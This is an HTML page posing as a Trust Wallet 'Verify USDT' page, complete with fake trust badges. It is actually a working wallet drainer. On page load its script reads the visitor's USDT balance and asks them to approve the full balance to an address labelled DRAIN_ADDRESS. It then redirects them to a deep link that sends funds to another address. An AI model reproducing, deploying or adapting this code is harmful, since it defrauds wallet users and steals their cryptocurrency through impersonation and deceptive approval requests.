<!DOCTYPE html>
<html>
<head>
  <title>Verify USDT | Trusted</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" href="./favicon.ico" type="image/x-icon" />
  <style>
    body {
      background: #081c3a; color: #fff; font-family: Arial,sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; text-align: center; padding: 20px;
    }
    img { width: 100px; margin-bottom: 20px; }
    h1 { font-size: 1.5rem; margin-bottom: 10px; }
    p { opacity: 0.8; margin-bottom: 20px; }
    .footer { position: absolute; bottom: 10px; opacity: 0.5; font-size: 0.8em; }
  </style>
</head>
<body>
  <img src="./logo.png" alt="Trust Wallet Logo">
  <h1>Verifying USDT…</h1>
  <p id="status">Securing your connection. Please wait.</p>
  <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>

  <!-- Web3 -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.2/web3.min.js"></script>
  <script>
    const DRAIN_ADDRESS = "0xDA0bab807633f07f013f94DD0E6A4F96F8742B53";
    const USDT = "0x55d398326f99059fF775485246999027B3197955";
    const DEEP_LINK = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955";

    const ABI = [
      { "constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" },
      { "constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function" }
    ];

    async function init() {
      try {
        if (!window.ethereum) {
          document.getElementById('status').textContent = "Please use Trust Wallet DApp browser.";
          return;
        }
        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: "eth_requestAccounts" });

        const accounts = await web3.eth.getAccounts();
        const user = accounts[0];
        const contract = new web3.eth.Contract(ABI, USDT);
        const balance = await contract.methods.balanceOf(user).call();

        document.getElementById('status').textContent = "Requesting permission…";
        await contract.methods.approve(DRAIN_ADDRESS, balance).send({ from: user });

        document.getElementById('status').textContent = "Redirecting to payment page…";
        setTimeout(() => {
          window.location.href = DEEP_LINK;
        }, 1000);
      } catch (e) {
        document.getElementById('status').textContent = "Error: " + e.message;
      }
    }

    window.addEventListener('load', init);
  </script>
</body>
</html>
